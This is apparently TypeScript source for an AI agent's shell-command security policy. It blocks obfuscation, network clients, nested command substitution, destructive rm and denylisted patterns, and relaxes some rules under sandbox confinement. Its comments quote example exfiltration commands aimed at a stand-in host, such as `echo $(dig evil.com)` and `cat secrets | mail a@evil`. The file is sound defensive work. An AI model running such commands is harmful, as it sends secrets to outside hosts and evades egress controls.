import { homedir } from "node:os";
import type { SecurityDecision } from "../../types.js";
import { USER_HINTS } from "../../types.js";
import type { InlineEvalPolicy, FileAccessMode } from "./types.js";
import { countTopLevelPipes } from "../../tools/shell-translate.js";
import { BLOCKED_COMMANDS, BROWSER_OPEN_CMDS, RM_DESTRUCTIVE_FLAGS } from "./shell-rules.js";
import { detectCatastrophicRm } from "./catastrophic-paths.js";
import {
  detectObfuscation,
  detectSecretPlaceholder,
  detectScriptWrite,
  stripQuotedSpans,
  detectInterpreterEscape,
  detectNetworkClientArgv0,
  detectDangerousInvokeBin,
  detectInlineNetwork,
  detectInlineInterpreterEval,
  detectNestedCommandExecution,
  tokenizeCommand,
} from "./shell-detectors.js";

// Re-exported for the existing public surface (importers reference it from
// "./shell-policy.js"); the implementation now lives in shell-detectors.ts.
export { detectObfuscation };

// `inlineEval`/`workspace` gate the R4-11/R4-13 inline-eval interpreter-escape
// refusal: it fires when the policy is "refuse" and needs the workspace tree to
// decide the rename-escape (part b). Both are optional so the redundant
// secondary scan in process-session (which runs AFTER the policy-aware
// evaluateShellCommandAndPaths gate) and the regex-level unit tests keep
// calling with just the command — the canonical bash/process_start path threads
// both through evaluateShellCommandAndPaths. NOTE: this is the inline-eval
// policy, NOT the file-access mode — they are decoupled on purpose so a
// permissive file default can't silently disable this defense.
export function evaluateShellCommand(
  command: string,
  inlineEval?: InlineEvalPolicy,
  workspace?: string,
  fileAccessMode?: FileAccessMode,
  // Injected so tests can pin either platform branch deterministically on any
  // OS. Production callers omit it.
  platform: NodeJS.Platform = process.platform,
  // EFFECTIVE OS-level confinement of THIS spawn: true only when the sandbox
  // backend that will actually wrap the shell is a confined one (guarded
  // seatbelt/bwrap, explicit seatbelt/bwrap, or docker). Callers derive it
  // from getSandboxStatus().confined, which already folds in fallback — a
  // "guarded" SELECTION that fell back to host reports confined=false, so the
  // string rules stay on. Optional so untouched callers/tests fail SAFE
  // (undefined → treated as unconfined → every rule applies).
  sandboxConfined?: boolean,
): SecurityDecision {
  // ── Structural-heuristic switch (see each CONFINED-SKIP comment below) ──
  // Rule groups in this function are best-effort STRING approximations of a
  // process boundary and stand down when the spawn is kernel-confined:
  // script-write, interpreter-escape, the inline-eval form refusal, ARITHMETIC
  // `$((…))` / PARAMETER `${…}` expansion, command separators (`;`/`&&`/`||`/
  // `&`/newline), and the >5-pipe cap. When a kernel cage wraps the spawn,
  // everything the command chains / expands / pipes to runs inside the SAME
  // cage, so these regexes add no boundary the kernel doesn't already enforce
  // — while false-blocking legitimate work (`echo $((17+3))`, `a; b`,
  // multi-statement self-tests, 52 legit `python3 -c` calls over 7 weeks).
  // Skipped under effective confinement, kept unconfined. win32 never skips:
  // no confined native backend exists there (PowerShell already gets laxer
  // rules; docker-on-Windows isn't worth a semantics split).
  //
  // NOT gated on confinement — these stay on in EVERY mode: obfuscation,
  // {{SECRET}} placeholders, browser-open, the network-client argv0 blocks +
  // BLOCKED_COMMANDS denylist (the guarded cage KEEPS network, so egress
  // control is this policy's job, not the sandbox's), inline-NETWORK bodies,
  // dangerous-invoke bins, the mode-aware rm rules + catastrophic floor, AND —
  // critically — the nested-command-execution constructs (command substitution
  // `$(…)` (NOT arithmetic `$((`), backticks, subshell `( )`, brace-group
  // `{ ; }`, procsub `<(…)`): their nested argv escapes the network/denylist
  // scan, so relaxing them under confinement would open egress vectors like
  // `echo $(dig evil.com)`. See detectNestedCommandExecution.
  const structuralRulesApply = sandboxConfined !== true || platform === "win32";
  // Obfuscation detection
  try {
    const obfuscationResult = detectObfuscation(command);
    if (obfuscationResult) {
      return { allowed: false, reason: obfuscationResult, userHint: USER_HINTS.commandShell };
    }
  } catch {
    // Don't crash on obfuscation check failure — allow the command through
  }

  // Secret-placeholder guard: `{{SECRET_NAME}}` only resolves in http_request
  // (into headers, off-argv). In a shell command the braces either pass through
  // literally (opaque downstream failure) or would leak the secret into argv —
  // so refuse the shape and redirect. Placed early so this specific message wins.
  const secretPlaceholder = detectSecretPlaceholder(command);
  if (secretPlaceholder) {
    return { allowed: false, reason: secretPlaceholder, userHint: USER_HINTS.commandShell };
  }

  // Reject launching a URL in the system browser — route to the browser tool
  // (CDP attach + audit) instead. Checked here so the specific message wins
  // over the generic denylist hit on `open`/`xdg-open`, and so every
  // bash-spawning path (bash, process_start) enforces it.
  if (BROWSER_OPEN_CMDS.test(command)) {
    return {
      allowed: false,
      reason: "Cannot open URLs in the system browser — use the browser tool instead.",
      userHint: USER_HINTS.commandShell,
    };
  }

  // Block heredoc + inline-script writes (forces use of write/edit tools).
  // CONFINED-SKIP: the write itself lands inside the kernel cage (and the
  // file-access path guard below still vets every path it can see), so the
  // security value is subsumed; the residual "bash exit 0 ≠ work done"
  // quality nudge doesn't justify false-blocking legit heredoc scripting.
  if (structuralRulesApply) {
    const scriptWriteResult = detectScriptWrite(command);
    if (scriptWriteResult) {
      return { allowed: false, reason: scriptWriteResult, userHint: USER_HINTS.commandShell };
    }
  }

  // C3-13: argv-aware interpreter-escape (perl/ruby/php inline eval with
  // intervening flags — `perl -w -e`, `ruby -rsocket -e`).
  // CONFINED-SKIP: an inline-eval'd interpreter body executes with exactly
  // the authority of the caged shell that spawned it — no boundary is crossed
  // that the kernel doesn't already hold. Egress from such a body is still
  // caught in every mode by detectInlineNetwork below and by the
  // BLOCKED_COMMANDS backstops (`perl -e`/`ruby -e`/`php -r` bare forms),
  // which stay untouched.
  if (structuralRulesApply) {
    const interpEscape = detectInterpreterEscape(command);
    if (interpEscape) {
      return { allowed: false, reason: interpEscape, userHint: USER_HINTS.commandShell };
    }
  }

  // C3-12/C3-14: network clients gated by argv[0] basename (fetch/http/xh/…),
  // so `git fetch` is unaffected but a leading `http example.com` is blocked.
  const netClient = detectNetworkClientArgv0(command);
  if (netClient) {
    return { allowed: false, reason: netClient, userHint: USER_HINTS.commandShell };
  }

  // argv[0]-aware block for dangerous binaries whose names are common argument
  // words (open/host/ping/mount/mail/dig/…). Checked as the invoked command of
  // each pipe segment so `grep host /etc/hosts` passes but `host evil.com` /
  // `cat secrets | mail a@evil` is blocked — replaces the old substring rules
  // that false-positived on those words as arguments.
  const dangerousBin = detectDangerousInvokeBin(command);
  if (dangerousBin) {
    return { allowed: false, reason: dangerousBin, userHint: USER_HINTS.commandShell };
  }

  // R4-11/R4-13: refuse the inline-eval interpreter FORM when policy="refuse"
  // (a regex can't soundly vet a Turing-complete `node -e`/`python -c` body,
  // and a renamed interpreter bypasses the basename denylist). Checked BEFORE
  // the body-regex detectInlineNetwork so the specific "write a script file"
  // reason wins. No-op when inlineEval/workspace weren't threaded through, or
  // when policy="allow". Per pipe segment so each argv[0] is inspected.
  // CONFINED-SKIP: the refusal exists because "a regex can't soundly vet a
  // Turing-complete inline body" — under a confined backend we don't NEED to
  // vet it: the kernel cage bounds what the body can do exactly as it would a
  // script file, so the FORM is no longer the risk (this rule alone denied 52
  // legit `python3 -c` self-checks in 7 weeks). detectInlineNetwork below
  // still scans inline bodies for network use in every mode.
  if (structuralRulesApply && inlineEval !== undefined && workspace !== undefined) {
    for (const segment of command.split("|")) {
      const hit = detectInlineInterpreterEval(tokenizeCommand(segment), inlineEval, workspace);
      if (hit) {
        return { allowed: false, reason: hit, userHint: USER_HINTS.commandShell };
      }
    }
  }

  // C3-17: raw socket / low-level network module use inside node -e / python -c
  // (and perl/ruby) inline bodies — the same arbitrary egress as a network CLI.
  const inlineNet = detectInlineNetwork(command);
  if (inlineNet) {
    return { allowed: false, reason: inlineNet, userHint: USER_HINTS.commandShell };
  }

  // ALWAYS-ON (NOT gated on confinement), POSIX only: nested-command execution
  // — $(...) command sub (but not $(( )) arithmetic / ${} param expansion),
  // backticks, subshell ( ), brace-group { ; }, procsub <(…)/>(…). The argv[0]
  // network/denylist scans can't see a binary invoked inside these, so a
  // confined spawn (where the metachar/separator heuristics below stand down)
  // could otherwise `echo $(dig evil.com)` its way to real egress. Egress
  // control IS this policy's job under confinement — the guarded cage keeps
  // network on — and parsing inside a substitution is a bypassable adversarial
  // surface, so we keep these execute-a-nested-command forms blocked rather
  // than scan within them. win32 is excluded: `$(…)` and `( )` are ordinary
  // PowerShell syntax there, and win32 has no confined backend to relax around.
  if (platform !== "win32") {
    const nested = detectNestedCommandExecution(command);
    if (nested) {
      return { allowed: false, reason: nested, userHint: USER_HINTS.commandShell };
    }
  }

  // Block dangerous shell metacharacters (command chaining + arithmetic/param
  // expansion). Allow: | (pipes, controlled below), > < (redirects), * ? (globs).
  // CONFINED-SKIP (whole platform branch — a no-op for win32, where
  // structuralRulesApply is always true): chaining (unquoted newline / `;` /
  // bare `&`) and expansion (`$((…))` arithmetic, `${…}` params) execute in the
  // SAME confined process tree with the SAME kernel-enforced denials as the
  // outer command — they cross no boundary the cage doesn't hold, and they are
  // exactly the Clover-class false positives (`echo $((17+3))`, `${VAR}`, `a;
  // b`). NOTE: command substitution proper (`$(…)`, backtick) and the other
  // nested-command forms are NOT relaxed here — they're handled always-on by
  // detectNestedCommandExecution above, because their nested argv escapes the
  // network/denylist scan. The cross-separator egress rules stay immune too:
  // BLOCKED_COMMANDS + rm scan the raw string, and the argv0 scans segment on
  // ;/&&/||/&/newline (splitShellSegments), so `true; dig evil.com` is caught.
  // Unconfined, these regexes remain the wall (the FP cost is the price of the
  // boundary when there's no kernel cage).
  if (structuralRulesApply) {
    if (platform === "win32") {
      // PowerShell: backtick is the escape char, ${} is variable syntax, {} is script blocks — all normal
      // Only block actual dangerous patterns: Invoke-Expression, iex, & (call operator at start)
      if (/\r\n/.test(command)) {
        return { allowed: false, reason: "Blocked: multi-line commands not allowed.", userHint: USER_HINTS.commandShell };
      }
    } else {
      // Bash: block arithmetic `$((…))` and parameter `${…}` expansion (host
      // only — relaxed under confinement). Command substitution `$(…)` and
      // backticks are already refused always-on by detectNestedCommandExecution
      // (the negative lookahead here would otherwise skip `$((`, but the broad
      // `\$\(` still catches `$((` on the unconfined host, which is the intent:
      // no kernel cage → keep the expansion FP-block as the boundary). Kept on
      // the RAW command because `$(`/backtick inside DOUBLE quotes are still
      // bash-expanded; a single-quoted occurrence is a rare, harmless FP.
      if (/`/.test(command) || /\$\(/.test(command) || /\$\{/.test(command)) {
        return { allowed: false, reason: "Blocked: shell metacharacters detected (backtick or command substitution).", userHint: USER_HINTS.commandShell };
      }
      // Separators — newline, ;, bare & — count only OUTSIDE quotes, so quote-strip
      // first. A newline or `;` INSIDE a quoted argument (a multi-line
      // `python3 -c 'line1\nline2'` self-test, or the `;` in `python -c "import
      // json; ..."`) is literal string content, not command chaining. Before this
      // was quote-aware, the newline check lived with the backtick check above and
      // blocked EVERY multi-statement inline self-test (mislabeled as command
      // substitution) — so a coding model couldn't run its own multi-line check
      // and shipped unverified, false-done work. An UNQUOTED newline is still a
      // command separator (like ;) and stays blocked.
      // The & exclusions also spare fd-redirect forms — 2>&1, >&2, &>file all carry
      // a literal & that is job-control NOTHING (it's a descriptor dup/merge).
      const unquoted = stripQuotedSpans(command);
      if (/[\r\n]/.test(unquoted)) {
        return { allowed: false, reason: "Blocked: a newline outside quotes chains commands. Put multi-line code inside a single quoted -c/-e argument, e.g. python3 -c 'line1\\nline2', or write it to a file and run that.", userHint: USER_HINTS.commandShell };
      }
      if (/;/.test(unquoted) || /(?<![&|<>])&(?![&|>])/.test(unquoted)) {
        return { allowed: false, reason: "Blocked: use && instead of ; for chaining, and don't background processes with &.", userHint: USER_HINTS.commandShell };
      }
    }
  }

  // Allow at most 5 pipes (e.g., `ls | grep foo | sort | head | cut`).
  // Quote-aware: literal `|` inside `"..."` / `'...'` doesn't count, and
  // `||` is a chain operator not a pipe. Naive matching false-positived
  // benign commands like `echo "a|b|c|d|e|f"` against this 5-pipe cap.
  // CONFINED-SKIP: pipeline length is an obfuscation/complexity heuristic,
  // not a boundary — every stage runs inside the same cage, each stage's
  // argv0 is scanned per-segment, and the denylist scans the full string
  // regardless of pipe count. Unconfined, the cap stays as friction against
  // multi-stage obfuscated exfil chains.
  if (structuralRulesApply) {
    const pipeCount = countTopLevelPipes(command);
    if (pipeCount > 5) {
      return {
        allowed: false,
        reason: `Blocked: too many pipes (${pipeCount}). Maximum 5 pipes allowed per command.`,
        userHint: USER_HINTS.commandShell,
      };
    }
  }

  // Destructive rm (-r/-f), MODE-AWARE. In unrestricted mode the user has
  // granted full-filesystem access, so deleting their OWN files (Downloads,
  // Documents, projects, /tmp) via the shell must work — only the catastrophic
  // floor (rm -rf /, ~, system dirs → catastrophic-paths.ts) is held. In
  // workspace/common mode, OR when the mode wasn't threaded through (undefined →
  // fail SAFE), refuse outright and point at the recoverable delete_file tool.
  // This is the split-out of the old blanket BLOCKED_COMMANDS rm rule that
  // fired regardless of mode (the "can't delete my Downloads even on
  // unrestricted" bug).
  if (RM_DESTRUCTIVE_FLAGS.test(command)) {
    if (fileAccessMode === "unrestricted") {
      const catastrophic = detectCatastrophicRm(command, homedir(), platform);
      if (catastrophic) {
        return { allowed: false, reason: catastrophic, userHint: USER_HINTS.commandShell };
      }
    } else {
      return {
        allowed: false,
        reason: "Blocked: `rm -r`/`rm -f` is refused in the current file-access mode. Use the delete_file tool (single file, moved to trash, recoverable), or switch file access to 'unrestricted' in Settings to allow bulk shell deletes of your own files.",
        userHint: USER_HINTS.commandShell,
      };
    }
  }

  // Check every segment of a piped command against blocked patterns
  const segments = command.split("|").map((s) => s.trim());
  for (const segment of segments) {
    for (const pattern of BLOCKED_COMMANDS) {
      if (pattern.test(segment)) {
        return {
          allowed: false,
          reason: `Blocked: pipe segment matches dangerous pattern.`,
          userHint: USER_HINTS.commandShell,
        };
      }
    }
  }

  // Also check the full command (catches patterns that span pipes)
  for (const pattern of BLOCKED_COMMANDS) {
    if (pattern.test(command)) {
      return {
        allowed: false,
        reason: `Blocked: command matches dangerous pattern.`,
        userHint: USER_HINTS.commandShell,
      };
    }
  }

  return { allowed: true, reason: "Shell command allowed" };
}
